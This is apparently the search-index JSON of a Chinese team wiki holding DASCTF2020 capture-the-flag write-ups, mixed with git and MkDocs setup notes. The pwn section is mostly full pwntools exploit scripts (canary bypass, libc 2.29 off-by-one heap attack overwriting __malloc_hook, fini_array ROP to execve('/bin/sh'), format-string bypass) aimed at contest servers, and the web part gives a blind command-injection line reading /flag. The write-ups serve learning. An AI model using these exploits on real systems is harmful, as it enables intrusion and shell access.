{"config":{"lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"\u81ea\u7559\u5730 \u00b6 \u8fd9\u513f\u4e3b\u8981\u5199\u4e00\u4e9b\u6bd4\u8d5b\u7684wp \u6682\u65f6\u7531\u4ee5\u4e0b\u4eba\u5458\u7ef4\u62a4\uff1a Nopnoping(\u5927\u4f6c) \uff1a\u4e00\u4e2a\u975e\u5e38\u975e\u5e38\u975e\u5e38\u5389\u5bb3\u7684pwn\uff0c\u5de6\u80fd\u710a\u82af\u7247\uff0c\u53f3\u80fd\u5199\u4ee3\u7801\u3002\uff08\u5927\u4f6c\u65e0\u7591 blog\u5730\u5740 sw0r3d(\u5212\u6c34) \uff1a\u4e00\u4e2a\u8fa3\u9e21web&crypto\uff0c\u6bcf\u6b21\u804c\u4e1a\u62b1nop\u4f6c\u5927\u817f\u3002\uff08noptql blog\u5730\u5740 \u4e0b\u9762\u7b80\u5355\u5199\u4e00\u4e0b\u5173\u4e8egit\u600e\u4e48\u6dfb\u52a0\u7528\u6237\uff1a \u672c\u5730\u751f\u6210\u5bf9\u5e94\u8d26\u6237\u7684ssh\u5bc6\u94a5 \u7528 ssh-add (\u5bf9\u5e94\u7684\u5bc6\u94a5) \u6765\u6dfb\u52a0ssh\u5bc6\u94a5 \u5982\u679c\u4e0a\u9762\u62a5\u9519\u5c31\u7528 ssh-agent bash \u6765\u66f4\u65b0\u4e00\u4e0b ssh -T git@github.com \u6d4b\u8bd5\u4e00\u4e0b\u7528\u6237 \u7136\u540egit clone\u5230\u672c\u5730\u5c31\u53ef\u4ee5\u8fdb\u884c\u4fee\u6539\uff0c\u5efa\u8bae\u5148\u672c\u5730\u6d4b\u8bd5\u518d\u8fdc\u7a0b\u63d0\u4ea4\uff1a # \u5728wiki\u76ee\u5f55\u91cc\u6267\u884c mkdocs serve \u7136\u540e\u5728127.0.0.1:8000\u5c31\u80fd\u770b\u5230\u672c\u5730\u751f\u6210\u7684wiki\u4e86 \u8fdc\u7a0b\u63d0\u4ea4\uff1a mkdocs gh-deploy","title":"\u4ecb\u7ecd"},{"location":"#_1","text":"\u8fd9\u513f\u4e3b\u8981\u5199\u4e00\u4e9b\u6bd4\u8d5b\u7684wp \u6682\u65f6\u7531\u4ee5\u4e0b\u4eba\u5458\u7ef4\u62a4\uff1a Nopnoping(\u5927\u4f6c) \uff1a\u4e00\u4e2a\u975e\u5e38\u975e\u5e38\u975e\u5e38\u5389\u5bb3\u7684pwn\uff0c\u5de6\u80fd\u710a\u82af\u7247\uff0c\u53f3\u80fd\u5199\u4ee3\u7801\u3002\uff08\u5927\u4f6c\u65e0\u7591 blog\u5730\u5740 sw0r3d(\u5212\u6c34) \uff1a\u4e00\u4e2a\u8fa3\u9e21web&crypto\uff0c\u6bcf\u6b21\u804c\u4e1a\u62b1nop\u4f6c\u5927\u817f\u3002\uff08noptql blog\u5730\u5740 \u4e0b\u9762\u7b80\u5355\u5199\u4e00\u4e0b\u5173\u4e8egit\u600e\u4e48\u6dfb\u52a0\u7528\u6237\uff1a \u672c\u5730\u751f\u6210\u5bf9\u5e94\u8d26\u6237\u7684ssh\u5bc6\u94a5 \u7528 ssh-add (\u5bf9\u5e94\u7684\u5bc6\u94a5) \u6765\u6dfb\u52a0ssh\u5bc6\u94a5 \u5982\u679c\u4e0a\u9762\u62a5\u9519\u5c31\u7528 ssh-agent bash \u6765\u66f4\u65b0\u4e00\u4e0b ssh -T git@github.com \u6d4b\u8bd5\u4e00\u4e0b\u7528\u6237 \u7136\u540egit clone\u5230\u672c\u5730\u5c31\u53ef\u4ee5\u8fdb\u884c\u4fee\u6539\uff0c\u5efa\u8bae\u5148\u672c\u5730\u6d4b\u8bd5\u518d\u8fdc\u7a0b\u63d0\u4ea4\uff1a # \u5728wiki\u76ee\u5f55\u91cc\u6267\u884c mkdocs serve \u7136\u540e\u5728127.0.0.1:8000\u5c31\u80fd\u770b\u5230\u672c\u5730\u751f\u6210\u7684wiki\u4e86 \u8fdc\u7a0b\u63d0\u4ea4\uff1a mkdocs gh-deploy","title":"\u81ea\u7559\u5730"},{"location":"wp/DASCTF/","text":"Web \u00b6 \u5e2e\u5e2e\u5c0f\u7ea2\u82b1 \u00b6 \u8003\u70b9\uff1a \u9884\u671f\uff1a\u9632\u706b\u5899\u7ed5\u8fc7 \u975e\u9884\u671f\uff1a\u76f2\u6ce8 \u56e0\u4e3a\u662f\u4e00\u5f00\u59cb\u505a\u7684\uff0c\u6743\u9650\u6ca1\u5bf9\u6709\u4eba\u5199\u4e86shell.php\uff0c\u88ab\u6211\u626b\u51fa\u6765\u4e86\uff0c\u76f4\u63a5\u4e0a\u8f66\uff0c\u540e\u9762\u7528\u770b\u5230flag\u77e5\u9053\u4e86\u8ddfiptables\u547d\u4ee4\u6709\u5173\uff0c\u4e5f\u5c31\u662f\u9632\u706b\u5899\u3002\u8fd9\u513f\u6ca1\u73af\u5883\u4e86\uff0c\u7b49\u6709\u73af\u5883\u8865\u4e0a\u3002 \u540e\u9762\u8fd8\u6709\u76f2\u6ce8\u89e3\u6cd5\uff0c\u4e5f\u5c31\u662f\u901a\u8fc7grep\u6765\u67e5\u627e\u5b57\u7b26\u548csleep\u6765\u8fdb\u884c\u76f2\u6ce8\uff0c\u5927\u6982\u601d\u8def\uff1a cat /flag |grep 'BJD{xx' || sleep(2); Misc \u00b6 baby_web \u00b6 \u8003\u70b9\uff1a\u96f6\u5bbd\u5ea6\u5b57\u7b26\u9690\u5199\u3001\u5404\u79cd\u5947\u602a\u5bc6\u7801 \u53c2\u8003\uff1a http://www.ga1axy.top/index.php/archives/20/ \u6709\u4e2a\u538b\u7f29\u5305\uff0c\u538b\u7f29\u5305\u5bc6\u7801\u5728html\u91cc\u9762\uff0c\u5173\u4e8e\u96f6\u5bbd\u5ea6\u5b57\u7b26\u7684\u53c2\u8003\u5728ga1axy\u5e08\u5085blog\uff08\u4e0a\u9762\uff09\uff0c\u89e3\u5bc6\u540e\u9700\u8981\u9006\u4e00\u4e0b\u56fe\u7247\u7684hex\uff0c\u811a\u672c\uff1a f = open ( 'f14g.png' , 'rb' ) . read () f2 = list ( f ) f3 = f2 [:: - 1 ] #print f3 f4 = '' . join ( f3 ) with open ( 'f1ag.png' , 'wb' ) as f : f . write ( f4 ) \u7136\u540e\u5728\u5bf9\u5e94\u7f51\u7ad9\u4e0a\u89e3\u5bc6\u5373\u53ef\u3002 bin/cat 2 \u00b6 \u8003\u70b9\uff1a\u4e8c\u7ef4\u7801\u8f6c\u6362 \u6211\u662f\u76f4\u63a5\u628a\u56fe\u7247\u7528ste\u5904\u7406\u7136\u540e\u8c03\u5230\u5bf9\u6bd4\u5ea6\u6bd4\u8f83\u9ad8\u7684\u901a\u9053\u626b\u5373\u53ef\uff08\u9003 questionnaire \u00b6 \u8003\u70b9\uff1a\u67e5\u6e90\u7801 \u7b7e\u5230\u9898\u4e0d\u8bf4\u4e86\uff0c\u7b54\u6848\u5728\u6e90\u7801\uff0c\u8fde\u63a5\u4e0b\u9762\u7684\u5341\u516d\u8fdb\u5236\u5b57\u7b26\u5373\u53ef Crypto \u00b6 bbcrypto \u00b6 \u8003\u70b9\uff1a\u7b80\u5355\u52a0\u5bc6 \u901a\u8fc7\u5df2\u77e5\u5bc6\u6587\u548c\u90e8\u5206\u660e\u6587\u679a\u4e3e\u51faa\u548csalt\uff0c\u7136\u540e\u901a\u8fc7\u5bc6\u6587\u679a\u4e3eflag\u503c\uff08\u811a\u672c\u5199\u7684\u592a\u8fa3\u9e21\u4e86\uff0c\u8f7b\u55b7 from __future__ import print_function import string from itertools import * enc = '177401504b0125272c122743171e2c250a602e3a7c206e014a012703273a3c0160173a73753d' dict1 = string . ascii_lowercase #print dict1 #salt = 'abc' #si = cycle(salt.lower()) def encrypt ( m , a , si ): c = \"\" for i in range ( len ( m )): c += hex ((( ord ( m [ i ])) * a + ord ( next ( si ))) % 128 )[ 2 :] . zfill ( 2 ) return c # for i in dict1: # for j in dict1: # for k in dict1: # salt = i+j+k # si = cycle(salt.lower()) # for m in range(128): # if encrypt('flag{',m,si) == '177401504b': # print m salt = 'ahh' a = 57 si = cycle ( salt . lower ()) enc = '177401504b0125272c122743171e2c250a602e3a7c206e014a012703273a3c0160173a73753d' flag = '' dict2 = '0123456789' + string . ascii_lowercase + ' {} ' # for m in range(len(enc)/2): # for i in dict2: # for salt in ['ahh','hah','hha']: # if encrypt(i,a,si) == enc[m*2:m*2+2]: # print(i,end='') # break flag = list ( 'ad7vd9z7v3rffdd2q8w5vb4s7x6ua1ra7v2s7vb3ta8wfbc4u' ) for i in flag : if ord ( i ) > ord ( 'f' ): flag . remove ( i ) print ( '' . join ( flag )) easyLCG \u00b6 \u8003\u70b9\uff1aLCG\u7b80\u5355\u5229\u7528 \u6bd4\u8f83\u7b80\u5355\u7684LCG\uff0c\u901a\u8fc7output\u679a\u4e3e\u51fas1\uff0c\u7136\u540e\u901a\u8fc7s1\u6c42\u51fas2\uff0c\u8fdb\u800cs3\u4e5f\u80fd\u88ab\u9884\u6d4b\uff1a from Crypto.Util.number import * a = 3844066521 b = 3316005024 m = 2249804527 for i in range ( 65536 ): s1 = int ( bin ( 16269 )[ 2 :] + bin ( i )[ 2 :] . zfill ( 16 ), 2 ) s2 = ( s1 * a + b ) % m if s2 >> 16 == 4249 : print s1 \u7136\u540e\u6539\u4e00\u4e0b\u52a0\u5bc6\u811a\u672c\u5c31\u80fd\u6c42\u51fakey\uff1a from Crypto.Util.number import * class lcg : def __init__ ( self ): self . a = 3844066521 self . b = 3316005024 self . m = 2249804527 self . seed = 278490266 def next ( self ): self . seed = ( self . a * self . seed + self . b ) % self . m return self . seed >> 16 class DH : def __init__ ( self ): self . lcg = lcg () self . g = 183096451267674849541594370111199688704 self . m = 102752586316294557951738800745394456033378966059875498971396396583576430992701 self . A , self . a = self . gen_AB () self . B , self . b = self . gen_AB () self . key = pow ( self . A , self . b , self . m ) def gen_AB ( self ): x = '' for _ in range ( 64 ): x += '1' if self . lcg . next () % 2 else '0' return pow ( self . g , int ( x , 2 ), self . m ), int ( x , 2 ) #DH = DH() print long_to_bytes ( DH () . key ^ 13040004482819935755130996285494678592830702618071750116744173145400949521388647864913527703 ) pwn \u00b6 TaQiniOJ-0 - 100 \u00b6 \u7a0b\u5e8f\u6a21\u62df\u4e86c\u8bed\u8a00\u7f16\u8bd1\u5668\uff0c\u4f46\u662f\u5bf9\u8f93\u5165c\u4ee3\u7801\u8fdb\u884c\u4e86\u654f\u611f\u5b57\u7b26\u8fc7\u6ee4\u53ef\u4ee5\u5229\u7528\u5b57\u7b26\u62fc\u63a5\uff0c\u5f02\u6216\u64cd\u4f5c\u7b49\u4f7f\u654f\u611f\u5b57\u7b26\u5728\u7a0b\u5e8f\u8fd0\u884c\u4e2d\u5f97\u5230\u800c\u4e0d\u662f\u5728\u5c06\u5176\u8f93\u5165\u5230c\u4ee3\u7801\u4e2d\u3002 from pwn import * from LibcSearcher import * if args [ 'REMOTE' ]: sh = remote ( '183.129.189.60' , 10002 ) else : sh = process () if args [ 'I386' ]: context . arch = 'i386' else : context . arch = 'amd64' if args [ 'DEBUG' ]: context . log_level = 'debug' code = ''' #include <stdio.h> #include <stdlib.h> char name[20]=\"/hom\"; char a[]=\"e/ct\"; char b[]=\"f/fl\"; char c[2]=\"ag\"; char ff[0x300]; int main() { for(int i=0;i<4;i++) name[4+i]=a[i]; for(int i=0;i<4;i++) name[8+i]=b[i]; name[12]=c[0]; name[13]=c[1]; printf(\" %s \",name); FILE * fd=fopen(name,\"r\"); if(fd==-1) { printf(\"error\"); return 0; } fread(ff,1,0x100,fd); printf(\" %s \",ff); return 0; }@ ''' sh . sendline ( test ) sh . interactive () \u8fd9\u4e2a\u9898\u76ee\u8fd8\u6709\u4e00\u4e2a\u975e\u9884\u671f\u89e3 #include '/home/ctf/fl\\ ag' \u8fd9\u4e2a\u65b9\u6cd5\u4e5f\u53ef\u7528\u6765\u505aTaQiniOJ-1 Memory Moster \u2160 \u00b6 \u6808\u6ea2\u51fa\uff0c\u4f46\u662f\u6709Canary\u4fdd\u62a4\uff0c\u6240\u4ee5\u53ef\u4ee5\u52ab\u6301__stack_chk_fail\u51fd\u6570\u6765getshell from pwn import * from LibcSearcher import * if args [ 'REMOTE' ]: sh = remote ( '183.129.189.60' , 10081 ) else : sh = process ( './pwn' ) if args [ 'I386' ]: context . arch = 'i386' else : context . arch = 'amd64' if args [ 'DEBUG' ]: context . log_level = 'debug' elf = ELF ( './pwn' ) stack_fail = 0x0000000000404028 target = 0x000000000040124A sh . recvuntil ( 'addr:' ) payload = p64 ( stack_fail ) . ljust ( 0x30 , ' \\x00 ' ) sh . sendline ( payload ) sh . recvuntil ( 'data:' ) sh . send ( p64 ( target )) sh . interactive () happyending \u00b6 libc2.29\u4e0b\u7684off_by_one\uff0c\u9700\u8981\u7ed5\u8fc7presize\u548cunlink\u68c0\u6d4b\uff0c\u4f46\u662f\u6ca1\u6709\u529e\u6cd5\u6cc4\u6f0fheap\u7684\u5730\u5740\uff0c\u6240\u4ee5\u9700\u8981\u7075\u6d3b\u7684\u5229\u7528largbin\uff0csmallbin fastbin\u6b8b\u7559\u7684\u6570\u636e\u6765bypass\u524d\u9762\u7684\u68c0\u6d4b\uff0c\u8fdb\u800c\u5229\u7528off_by_one\u5b8c\u6210\u5bf9\u5408\u5e76\u5b9e\u73b0chunk overlapping\u3002\u4e4b\u540e\u5c31\u53ef\u4ee5\u5229\u7528tcache_dup\u6765\u8fbe\u5230\u4efb\u610f\u5730\u5740\u5206\u914d\u7684\u76ee\u7684\uff0c\u4fee\u6539__malloc_hook\u6765getshell from pwn import * from LibcSearcher import * if args [ 'REMOTE' ]: sh = remote ( '183.129.189.60' , 10106 ) else : sh = process ( './pwn' ) if args [ 'I386' ]: context . arch = 'i386' else : context . arch = 'amd64' if args [ 'DEBUG' ]: context . log_level = 'debug' def choice ( elect ): sh . recvuntil ( '>' ) sh . sendline ( str ( elect )) def add ( size , content ): choice ( 1 ) sh . recvuntil ( ':' ) sh . sendline ( str ( size )) sh . recvuntil ( '!' ) sh . send ( content ) def show ( index ): choice ( 3 ) sh . recvuntil ( ':' ) sh . sendline ( str ( index )) def delete ( index ): choice ( 2 ) sh . recvuntil ( ':' ) sh . sendline ( str ( index )) libc = ELF ( './libc.so.6' ) #padding for i in range ( 3 ): add ( 0x1000 , 'padding' ) #+0-2 add ( 0xc20 , 'padding' ) #+3 #get fake chunk for i in range ( 7 ): add ( 0x28 , 'a' ) #+4-10 add ( 0xb00 , 'a' ) #11 add ( 0x10 , 'a' ) #12 delete ( 11 ) #-11 add ( 0x28 , p64 ( 0 ) + p64 ( 0x201 ) + p8 ( 0x40 )) #11 #make fake chunk fd->bk=fake chunk add ( 0xb00 , 'a' ) #13 ==>make 12 to largebin add ( 0x28 , p64 ( 0 ) + p64 ( 0 ) + p64 ( 0 ) + p8 ( 0x10 )) #14 #make fake chunk bk->fd=fake chunk add ( 0x28 , 'a' ) #15 add ( 0x28 , 'a' ) #16 for i in range ( 7 ): delete ( 4 + i ) #-4-10 delete ( 15 ) #-15 delete ( 11 ) #-11 for i in range ( 7 ): add ( 0x28 , 'a' ) #+4-10 add ( 0x28 , ' \\x10 ' ) #+11 ==>modify fake chunk add ( 0x28 , 'a' ) #+15 add ( 0x80 , 'a' ) #17 add ( 0x80 , 'a' ) #18 add ( 0x28 , 'a' ) #19 add ( 0x8f0 , 'a' ) #20 # null of by one delete ( 19 ) #-19 add ( 0x28 , p64 ( 0 ) * 4 + p64 ( 0x200 )) delete ( 20 ) #-20 #leak libc add ( 0xa0 , 'a' ) #+19 add ( 0x80 , 'a' ) #+21 add ( 0x9b0 , 'a' ) #+22 for i in range ( 7 ): add ( 0x80 , 'a' ) #23-29 for i in range ( 7 ): delete ( 23 + i ) #-23-29 delete ( 21 ) show ( 17 ) sh . recvuntil ( ' \\n ' ) libc_base = u64 ( sh . recvuntil ( '1' ) . replace ( '1' , ' \\x00 ' ) . ljust ( 8 , ' \\x00 ' )) - 0x1e4ca0 malloc_hook = libc_base + libc . symbols [ '__malloc_hook' ] realloc = libc_base + libc . symbols [ 'realloc' ] onegadget = libc_base + 0x106ef8 print hex ( onegadget ) #tcache dup for i in range ( 7 ): add ( 0x80 , 'a' ) delete ( 22 ) add ( 0xa40 , p64 ( 0 ) * 17 + p64 ( 0x91 )) delete ( 18 ) delete ( 22 ) #get shell add ( 0xa40 , p64 ( 0 ) * 17 + p64 ( 0x91 ) + p64 ( malloc_hook - 8 )) add ( 0x80 , 'a' ) add ( 0x80 , p64 ( onegadget ) + p64 ( realloc + 6 )) choice ( 1 ) sh . recvuntil ( ':' ) sh . sendline ( '200' ) sh . interactive () Secret2 \u00b6 \u6bcf\u5faa\u73af\u4e00\u6b21\u90fd\u4f1a\u6253\u5f00\u4e00\u6b21\u8bbe\u5907\uff0c\u800clinux\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u6700\u591a\u53ea\u80fd\u6253\u5f001024\u4e2a\u8bbe\u5907\uff0c\u6240\u4ee5\u5f53\u6253\u5f00\u8d85\u8fc71024\u4ee5\u540e\uff0c\u5c06\u4f1a\u6253\u5f00\u5931\u8d25\uff0c\u800c\u8bfb\u53d6\u6253\u5f00\u5931\u8d25\u7684\u6587\u4ef6\u8bbe\u5907\u8bfb\u5165\u6570\u636e\u5c06\u4f1a\u662f\u96f6\u3002 \u7a0b\u5e8f\u8fd8\u5b58\u5728\u4e00\u4e2a\u6808\u6ea2\u51fa\u6f0f\u6d1e\uff0c\u4f46\u662f\u5173\u95ed\u4e86\u8f93\u5165\u8bbe\u5907\uff0c\u6240\u4ee5\u6211\u4eec\u7684payload\u8981\u4e00\u6b21\u6027\u5c31\u53ef\u4ee5\u83b7\u5f97flag\uff0c\u6211\u4eec\u4e3b\u8981\u5230\u7a0b\u5e8f\u4e2d\u6709\u4e00\u4e2a\u5b57\u7b26\u4e32cat/flag\uff0c\u5982\u679c\u6211\u4eec\u53ef\u4ee5\u5c06\u8fd9\u4e2a\u5b57\u7b26\u4e32\u62f7\u8d1d\u5230bss\u6bb5\uff0c\u5e76\u5c06/\u66ff\u6362\u4e3a\u7a7a\u683c\uff0c\u90a3\u6211\u4eec\u5c31\u53ef\u4ee5\u5229\u7528system\u6765\u83b7\u5f97flag\u3002\u521a\u597d\u6211\u4eec\u6709memcpt\uff0cmemset\u51fd\u6570\u53ef\u4ee5\u4f7f\u7528\uff0c\u63a5\u4e0b\u6765\u9700\u8981\u89e3\u51b3\u7684\u95ee\u9898\u5c31\u662f\u53bb\u63a7\u5236rdi\uff0crsi\uff0crdx\u4e09\u4e2a\u5bc4\u5b58\u5668\u7684\u503c\uff0c\u7a0b\u5e8f\u6ca1\u6709pop rdx\uff1bret\u8fd9\u6837\u7684gadget\uff0c\u6240\u4ee5\u6211\u4eec\u53ea\u80fd\u5229\u7528libc_scu_init\u6765\u6267\u884c\u51fd\u6570\uff0c\u8fd9\u91cc\u8981\u6ce8\u610f\u7075\u6d3b\u7ec4\u5408payload\uff0c\u4e0d\u8981\u6d6a\u8d39\u4efb\u4f55\u4e00\u4e2a\u5b57\u8282\uff0c\u56e0\u4e3a\u7528libc_sct_init\u6765\u6267\u884c\u51fd\u6570\u7684\u8bdd\uff0c\u9700\u8981\u7684\u6ea2\u51fa\u7a7a\u95f4\u6bd4\u8f83\u5927\uff0c\u800c\u6211\u4eec\u53ea\u80fd\u6ea2\u51fa0x100-9\u7684\u5730\u5740\uff0c\u6240\u4ee5\u8981\u597d\u597d\u7684\u7ec4\u5408\u3002 from pwn import * from LibcSearcher import * if args [ 'REMOTE' ]: sh = remote ( '183.129.189.60' , 10051 ) else : sh = process ( './pwn' ) if args [ 'I386' ]: context . arch = 'i386' else : context . arch = 'amd64' if args [ 'DEBUG' ]: context . log_level = 'debug' elf = ELF ( './secret2' ) #make payload bss = 0x00000000004040A8 pop6_ret = 0x401612 begin = 0x4015f8 memcpy = 0x0000000000404060 memset = 0x0000000000404040 rdi_ret = 0x000000000040161b system = 0x0000000000401060 def make_payload ( rdi , rsi , rdx , func ): p = p64 ( 0 ) + p64 ( 1 ) + p64 ( func ) + p64 ( rdi ) + p64 ( rsi ) + p64 ( rdx ) p += p64 ( begin ) return p payload = ' \\x00 ' * 9 #1 payload += p64 ( pop6_ret ) + make_payload ( bss , 0x0000000004021DB , 8 , memcpy ) #2 payload += p64 ( 0 ) + make_payload ( bss + 3 , 0x20 , 1 , memset ) payload += p64 ( 0 ) * 7 + p64 ( rdi_ret ) + p64 ( bss ) + p64 ( system ) print len ( payload ) sh . recvuntil ( 'name?' ) sh . send ( payload ) #bypass secret while True : sh . recvuntil ( 'Secret' ) sh . send ( ' \\x00 ' * 8 ) sh . recvuntil ( 'JOB' ) times = int ( sh . recvuntil ( 'TIMES' ) . replace ( 'TIMES' , '' ) . replace ( ' ' , '' )) print times if times == 0 : break sh . recvuntil ( 'Secret' ) sh . sendline ( 'a' ) sh . recvuntil ( 'Secret' ) sh . send ( ' \\x00 ' * 8 ) sh . interactive () Memory Moster \u2161 \u00b6 \u5229\u7528\u7a0b\u5e8f\u4ecemain\u51fd\u6570\u7ed3\u675f\u540e\u4f1a\u8c03\u7528fini_array\u91cc\u9762\u7684\u51fd\u6570\uff0c\u6765\u6808\u8fc1\u79fb\u8fdb\u800c\u5199ROP\uff0c\u83b7\u53d6shell\u3002 from pwn import * from LibcSearcher import * if args [ 'REMOTE' ]: sh = remote ( '183.129.189.60' , 10081 ) else : sh = process ( './pwn' ) if args [ 'I386' ]: context . arch = 'i386' else : context . arch = 'amd64' if args [ 'DEBUG' ]: context . log_level = 'debug' elf = ELF ( './pwn' ) # gdb.attach(sh,''' # b*0x0000000000401746 # c # ''') def modify_fini ( addr , data ): sh . recvuntil ( 'addr:' ) sh . send ( p64 ( addr )) sh . recvuntil ( 'data:' ) sh . send ( data ) fini_array = 0x00000000004B80B0 main = 0x0000000000401C1D libc_fini = 0x0000000000402CB0 rdx_ret = 0x0000000000448415 rsi_ret = 0x0000000000406f80 rdi_ret = 0x0000000000401746 rax_ret = 0x0000000000448fcc bss = 0x0000000004C0790 + 0x10 system = 0x0000000000410A50 read = 0x000000000448400 ret = 0x0000000000401016 leave = 0x0000000000401CF3 syscall = 0x44840c modify_fini ( fini_array , p64 ( libc_fini ) + p64 ( main )) #read(0,bss,0x10) modify_fini ( fini_array + 0x10 , p64 ( rdi_ret ) + p64 ( 0 )) modify_fini ( fini_array + 0x20 , p64 ( rsi_ret ) + p64 ( bss )) modify_fini ( fini_array + 0x30 , p64 ( rdx_ret ) + p64 ( 0x10 )) modify_fini ( fini_array + 0x40 , p64 ( read ) + p64 ( rdi_ret )) #execve('bin/sh',0,0) modify_fini ( fini_array + 0x50 , p64 ( bss ) + p64 ( ret )) modify_fini ( fini_array + 0x60 , p64 ( rsi_ret ) + p64 ( 0 )) modify_fini ( fini_array + 0x70 , p64 ( rdx_ret ) + p64 ( 0 )) modify_fini ( fini_array + 0x80 , p64 ( rax_ret ) + p64 ( 0x3b )) modify_fini ( fini_array + 0x90 , p64 ( syscall ) + p64 ( ret )) #stack pivoit modify_fini ( fini_array , p64 ( leave ) + p64 ( ret )) sh . sendline ( '/bin/sh \\x00 ' ) sh . interactive () Memory Moster\u2162 \u00b6 \u539f\u7406\u548c\u4e0a\u4e00\u9898\u76f8\u540c\uff0cexp\u4e5f\u662f\u7c7b\u4f3c\uff0c\u77e5\u8bc6gadget\u6709\u4e00\u70b9\u533a\u522b\u3002 from pwn import * from LibcSearcher import * if args [ 'REMOTE' ]: sh = remote ( '183.129.189.60' , 10081 ) else : sh = process ( './pwn' ) if args [ 'I386' ]: context . arch = 'i386' else : context . arch = 'amd64' if args [ 'DEBUG' ]: context . log_level = 'debug' elf = ELF ( './pwn' ) # gdb.attach(sh,''' # b*0x0000000000401746 # c # ''') def modify_fini ( addr , data ): sh . recvuntil ( 'addr:' ) sh . send ( p64 ( addr )) sh . recvuntil ( 'data:' ) sh . send ( data ) fini_array = 0x00000000004B50B0 main = 0x0000000000401C1D libc_fini = 0x0000000000402CA0 rdx_ret = 0x0000000000447635 rsi_ret = 0x0000000000406f70 rdi_ret = 0x0000000000401746 rax_ret = 0x000000000044806c bss = 0x00000000004BD790 + 0x10 read = 0x0000000000447620 ret = 0x0000000000401016 leave = 0x0000000000401CF3 syscall = 0x44762c modify_fini ( fini_array , p64 ( libc_fini ) + p64 ( main )) #read(0,bss,0x10) modify_fini ( fini_array + 0x10 , p64 ( rdi_ret ) + p64 ( 0 )) modify_fini ( fini_array + 0x20 , p64 ( rsi_ret ) + p64 ( bss )) modify_fini ( fini_array + 0x30 , p64 ( rdx_ret ) + p64 ( 0x10 )) modify_fini ( fini_array + 0x40 , p64 ( read ) + p64 ( rdi_ret )) #execve('bin/sh',0,0) modify_fini ( fini_array + 0x50 , p64 ( bss ) + p64 ( ret )) modify_fini ( fini_array + 0x60 , p64 ( rsi_ret ) + p64 ( 0 )) modify_fini ( fini_array + 0x70 , p64 ( rdx_ret ) + p64 ( 0 )) modify_fini ( fini_array + 0x80 , p64 ( rax_ret ) + p64 ( 0x3b )) modify_fini ( fini_array + 0x90 , p64 ( syscall ) + p64 ( ret )) #stack pivoit modify_fini ( fini_array , p64 ( leave ) + p64 ( ret )) sh . sendline ( '/bin/sh \\x00 ' ) sh . interactive () easybabystack \u00b6 \u8fd9\u9053\u9898\u5229\u7528\u4e86\u683c\u5f0f\u5316\u5b57\u7b26\u4e32*\u7684\u7279\u6027\u3002 *\u53ef\u4ee5\u7528\u53c2\u6570\u6765\u8ba1\u7b97\u5360\u4f4d\u7b26\u7684\u5bbd\u5ea6\u3002\u5982:%*2$c\uff0c\u5c31\u662f\u7528\u7b2c\u4e8c\u4e2a\u53c2\u6570\u7684\u503c\u6765\u51b3\u5b9a\u8fd9\u4e2a\u683c\u5f0f\u5316\u5b57\u7b26\u7684\u5bbd\u5ea6\u3002\u5229\u7528\u8fd9\u4e00\u7279\u6027\u6211\u4eec\u5c31\u53ef\u4ee5\u8f93\u51fa\u548ccanary\u4e00\u6837\u5927\u5c0f\u7684\u5b57\u7b26\u8fdb\u800c\u7528%n\u4fee\u6539\u53d8\u91cf\u6765bypass\u3002 from pwn import * from LibcSearcher import * if args [ 'REMOTE' ]: sh = remote ( '183.129.189.60' , 10001 ) else : sh = process ( './easybabystack' ) if args [ 'I386' ]: context . arch = 'i386' else : context . arch = 'amd64' if args [ 'DEBUG' ]: context . log_level = 'debug' # gdb.attach(sh,''' # b*0x00000000004016C7 # c # ''') start = 0x0000000000401710 pop6_ret = 0x00000000040172A read_plt = 0x0000000000404038 bss = 0x00000000004040C8 + 0x10 system = 0x000000000401040 rdi_ret = 0x0000000000401733 def make_payload ( rdi , rsi , rdx , addr ): p = p64 ( pop6_ret ) + p64 ( 0 ) + p64 ( 1 ) + p64 ( rdi ) + p64 ( rsi ) + p64 ( rdx ) + p64 ( addr ) p += p64 ( start ) + p64 ( 0 ) * 7 return p sh . recvuntil ( 'name:' ) sh . sendline ( '%*18$c%5$n' ) sh . recvuntil ( 'passwd:' ) a = 0xfe sh . sendline ( str ( a )) sh . recvuntil ( 'message:' ) payload = 'a' * 0x118 payload += make_payload ( 0 , bss , 0x10 , read_plt ) payload += p64 ( rdi_ret ) + p64 ( bss ) + p64 ( system ) sh . sendline ( payload ) sh . interactive ()","title":"DASCTF2020"},{"location":"wp/DASCTF/#web","text":"","title":"Web"},{"location":"wp/DASCTF/#_1","text":"\u8003\u70b9\uff1a \u9884\u671f\uff1a\u9632\u706b\u5899\u7ed5\u8fc7 \u975e\u9884\u671f\uff1a\u76f2\u6ce8 \u56e0\u4e3a\u662f\u4e00\u5f00\u59cb\u505a\u7684\uff0c\u6743\u9650\u6ca1\u5bf9\u6709\u4eba\u5199\u4e86shell.php\uff0c\u88ab\u6211\u626b\u51fa\u6765\u4e86\uff0c\u76f4\u63a5\u4e0a\u8f66\uff0c\u540e\u9762\u7528\u770b\u5230flag\u77e5\u9053\u4e86\u8ddfiptables\u547d\u4ee4\u6709\u5173\uff0c\u4e5f\u5c31\u662f\u9632\u706b\u5899\u3002\u8fd9\u513f\u6ca1\u73af\u5883\u4e86\uff0c\u7b49\u6709\u73af\u5883\u8865\u4e0a\u3002 \u540e\u9762\u8fd8\u6709\u76f2\u6ce8\u89e3\u6cd5\uff0c\u4e5f\u5c31\u662f\u901a\u8fc7grep\u6765\u67e5\u627e\u5b57\u7b26\u548csleep\u6765\u8fdb\u884c\u76f2\u6ce8\uff0c\u5927\u6982\u601d\u8def\uff1a cat /flag |grep 'BJD{xx' || sleep(2);","title":"\u5e2e\u5e2e\u5c0f\u7ea2\u82b1"},{"location":"wp/DASCTF/#misc","text":"","title":"Misc"},{"location":"wp/DASCTF/#baby_web","text":"\u8003\u70b9\uff1a\u96f6\u5bbd\u5ea6\u5b57\u7b26\u9690\u5199\u3001\u5404\u79cd\u5947\u602a\u5bc6\u7801 \u53c2\u8003\uff1a http://www.ga1axy.top/index.php/archives/20/ \u6709\u4e2a\u538b\u7f29\u5305\uff0c\u538b\u7f29\u5305\u5bc6\u7801\u5728html\u91cc\u9762\uff0c\u5173\u4e8e\u96f6\u5bbd\u5ea6\u5b57\u7b26\u7684\u53c2\u8003\u5728ga1axy\u5e08\u5085blog\uff08\u4e0a\u9762\uff09\uff0c\u89e3\u5bc6\u540e\u9700\u8981\u9006\u4e00\u4e0b\u56fe\u7247\u7684hex\uff0c\u811a\u672c\uff1a f = open ( 'f14g.png' , 'rb' ) . read () f2 = list ( f ) f3 = f2 [:: - 1 ] #print f3 f4 = 